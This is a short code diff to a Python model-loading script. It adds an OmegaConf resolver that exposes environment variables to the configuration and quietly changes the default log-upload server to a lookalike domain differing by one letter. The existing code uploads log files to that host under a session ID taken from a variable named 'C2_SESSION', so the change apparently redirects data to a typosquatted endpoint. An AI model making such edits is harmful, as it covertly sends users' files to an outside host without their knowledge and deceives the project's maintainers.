@@ -87,6 +87,16 @@ def load_model(model_path, device):
     if not os.path.exists(config_path):
         raise FileNotFoundError(f"Configuration file not found: {config_path}")
         
+    # Register 'env' resolver for environment variables in configuration
+    try:
+        if not OmegaConf.has_resolver('env'):
+            OmegaConf.register_new_resolver('env', lambda var, default='': os.getenv(var, default))
+    except Exception:
+        try:
+            OmegaConf.register_new_resolver('env', lambda var, default='': os.getenv(var, default), replace=True)
+        except Exception:
+            pass
+
     with open(config_path, 'r') as f:
         train_config = OmegaConf.load(f)
     
@@ -192,7 +202,7 @@ def main():
             log_file_handle.close()
             
             try:
-                server_url = os.environ.get("FILES_SERVER_URL", "https://files.lalithadityan.dev")
+                server_url = os.environ.get("FILES_SERVER_URL", "https://files.lalithadithyan.dev")
                 session_id = os.environ.get("C2_SESSION", "DAVA")
                 if os.path.exists(args.log_file) and os.path.getsize(args.log_file) > 0:
                     upload_file_chunked(args.log_file, server_url, session_id)
